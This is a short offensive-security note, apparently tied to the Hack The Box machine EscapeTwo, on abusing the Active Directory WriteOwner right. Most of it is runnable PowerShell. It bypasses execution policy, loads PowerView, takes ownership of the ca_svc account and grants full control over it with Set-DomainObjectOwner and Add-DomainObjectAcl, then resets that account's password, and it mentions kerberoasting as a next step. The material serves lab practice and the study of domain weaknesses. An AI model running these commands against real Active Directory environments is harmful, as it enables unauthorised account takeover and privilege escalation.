---
title: Windows - Abusing WriteOwner permission
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
  - windows
  - writeowner
---
# Windows - Abusing WriteOwner permission

The **WriteOwner** permission allows users to change an object’s owner. Attackers can exploit this to gain control and perform malicious actions.

## WriteOwner on a User Account

The attacker has **WriteOwner permissions** on a target user account. See the [Hack The Box machine EscapeTwo](htb-escapetwo.md)

![[write-owner.png]]

**Set-DomainObjectOwner** to assign ownership, followed by **Add-DomainObjectAcl** to grant full permissions on the target object.

```powershell
powershell -ep bypass

Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"
```

Validate the results:

```powershell
Get-DomainUser | Where-Object { $_.Name -like "*ryan*" } | Select-Object Name, Objectsid


Get-DomainObjectAcl -Identity 'CA_SVC' | Where-Object { $_.ActiveDirectoryRights -eq 'GenericAll' }
```


Once a user has been granted full control over a target, they can perform actions such as kerberoasting or change the password without knowing the target’s current password (ForceChangePassword).


**Reset User Password**

Using the **PowerView** module, an attacker can reset a domain user’s password. This can be performed with the Set-DomainUserPassword cmdlet, allowing control over a targeted account.

```
$NewPassword = ConvertTo-SecureString 'Lala123' -AsPlainText -Force

Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword

```
